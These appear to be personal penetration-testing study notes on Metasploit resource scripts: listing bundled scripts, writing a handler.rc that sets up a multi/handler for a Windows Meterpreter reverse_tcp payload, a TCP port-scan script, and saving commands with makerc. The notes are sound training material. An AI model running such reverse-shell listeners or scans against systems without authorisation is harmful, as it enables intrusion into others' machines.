* There are few commands which can be reptitive like setting up a multi/handler
* Metasploit resource scripts operate similarly to batch scripts, whereby we can specify a set of MSFConsole commands thast we want to execute sequentially.

* PRACTICAL
* **Pre-packaged Scripts**
    * `ls -al /usr/share/metasploit-framework/scripts/resource/`
    * Check the script with VIM
    * `vim /usr/share/metasploit-framework/scripts/resource/[script_name]`
 
* **Write own script: Setup a handler with automated script**
  * `vim handler.rc`
  * `use multi/handler`
  * `set payload windows/meterpreter/reverse_tcp
  * `set lhost [ip]`
  * `set LPORT [PORT]`
  * `run`
  * ***
  * **How to use this script**:
    * `msfconsole -r handler.rc`
    * This will do everything in one step
   
* ***
* **Another script**
  * `vim portscan.rc`
  * `use auxiliary/scanner/portscan/tcp`
  * `set rhosts [IP]`
  * `run`
  * `msfconsole -r portscan.rc`
 ***
* **Load automated script from within the MSFConsole**
  * `resource ~/Desktop/Windows_Payloads/handler.rc`
 ***
* **Generate a resource script from within msfconsole**
  	* After following the manual process to use a module, if we want to save the commands that we have just typed:
    * `makerc ~/Desktop/portscan.rc` --> This will save all the commands previously executed.
    * `cat portscan.rc` --> Check if the commands are saved
